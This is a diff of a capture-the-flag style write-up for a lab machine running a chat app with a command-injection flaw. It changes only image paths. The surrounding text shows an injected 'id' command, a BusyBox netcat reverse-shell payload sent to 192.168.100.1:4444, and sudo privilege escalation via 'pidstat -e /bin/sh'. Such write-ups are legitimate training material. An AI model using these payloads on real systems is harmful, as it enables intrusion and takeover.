@@ -113,7 +113,7 @@ Key endpoints discovered:
 
 Navigating to `http://192.168.100.134/` redirects to the login page. It accepts an **Email Address** and **Password**, and user self-registration is available via `/sign-up`.
 
-![](machines/wmessage/image.png)
+![](images/img.png)
 
 A new account was registered via `/sign-up` and logged in successfully.
 
@@ -127,7 +127,7 @@ After authenticating, the application presents a real-time messaging interface t
 
 This is a critical hint: the application processes messages that begin with `!mpstat` as a server-side shell command — passing user-controlled input to the OS. Sending `!mpstat` alone returns live CPU statistics from the server, confirming that the backend is executing the actual `mpstat` binary and embedding its stdout into the chat response.
 
-![](image-1.png)
+![](images/img-1.png)
 
 The `mpstat` output visible in the chat confirms the server kernel version: **Linux 5.10.0-19-amd64 (MSG)**, x86_64 architecture, 1 CPU.
 
@@ -137,7 +137,7 @@ The `mpstat` output visible in the chat confirms the server kernel version: **Li
 
 To verify command injection, a semicolon was appended to chain the `id` command: `!mpstat ; id`. The server response appended the output of `id` directly to the `mpstat` output, confirming unauthenticated OS command execution as the web server user.
 
-![](image-2.png)
+![](images/img-2.png)
 
 The image clearly shows the server response containing:
 ```
@@ -163,7 +163,7 @@ The reverse shell payload was delivered through the message input box using Busy
 !mpstat ; busybox nc 192.168.100.1 4444 -e /bin/bash
 ```
 
-![](image-3.png)
+![](images/img-3.png)
 
 The connection was immediately received:
 
@@ -241,7 +241,7 @@ User www-data may run the following commands on MSG:
 
 `www-data` can execute `/bin/pidstat` as `messagemaster` without a password. Consulting GTFOBins for `pidstat`:
 
-![](image-4.png)
+![](images/img-4.png)
 
 GTFOBins confirms that `pidstat` supports a `-e` flag to execute an arbitrary command, and since `sudo` does not drop privileges, the spawned process runs as the target user. The command `pidstat -e /bin/sh` is the canonical technique.
 
